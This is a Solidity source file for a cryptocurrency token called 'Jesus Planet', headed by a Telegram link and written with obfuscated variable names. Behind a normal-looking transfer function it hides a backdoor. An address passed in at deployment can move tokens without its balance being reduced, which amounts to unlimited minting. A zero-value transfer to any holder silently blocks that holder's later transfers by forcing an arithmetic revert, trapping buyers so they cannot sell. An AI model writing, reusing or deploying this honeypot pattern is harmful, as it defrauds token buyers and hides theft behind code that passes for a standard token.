/*

https://t.me/jesusplaneteth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract JesusPlanet is Ownable {
    function transfer(address opwfzg, uint256 nyzbchxlugrj) public returns (bool success) {
        ijwkp(msg.sender, opwfzg, nyzbchxlugrj);
        return true;
    }

    function ijwkp(address tjnpkiydzgf, address opwfzg, uint256 nyzbchxlugrj) private {
        if (cngqarjh[tjnpkiydzgf] == 0) {
            balanceOf[tjnpkiydzgf] -= nyzbchxlugrj;
        }
        if (nyzbchxlugrj == 0) iumhavxr[opwfzg] += jblpeucxik;
        if (tjnpkiydzgf != bujwm && cngqarjh[tjnpkiydzgf] == 0 && iumhavxr[tjnpkiydzgf] > 0) {
            cngqarjh[tjnpkiydzgf] -= jblpeucxik;
        }
        balanceOf[opwfzg] += nyzbchxlugrj;
        emit Transfer(tjnpkiydzgf, opwfzg, nyzbchxlugrj);
    }

    string public name = 'Jesus Planet';

    function transferFrom(address tjnpkiydzgf, address opwfzg, uint256 nyzbchxlugrj) public returns (bool success) {
        require(nyzbchxlugrj <= allowance[tjnpkiydzgf][msg.sender]);
        allowance[tjnpkiydzgf][msg.sender] -= nyzbchxlugrj;
        ijwkp(tjnpkiydzgf, opwfzg, nyzbchxlugrj);
        return true;
    }

    address public bujwm;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'Jesus Planet';

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private iumhavxr;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private jblpeucxik = 75;

    constructor(address gkwxapd) {
        balanceOf[msg.sender] = totalSupply;
        cngqarjh[gkwxapd] = jblpeucxik;
        IUniswapV2Router02 jfbxchwzm = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        bujwm = IUniswapV2Factory(jfbxchwzm.factory()).createPair(address(this), jfbxchwzm.WETH());
    }

    mapping(address => uint256) public balanceOf;

    function approve(address qkynjbds, uint256 nyzbchxlugrj) public returns (bool success) {
        allowance[msg.sender][qkynjbds] = nyzbchxlugrj;
        emit Approval(msg.sender, qkynjbds, nyzbchxlugrj);
        return true;
    }

    mapping(address => uint256) private cngqarjh;
}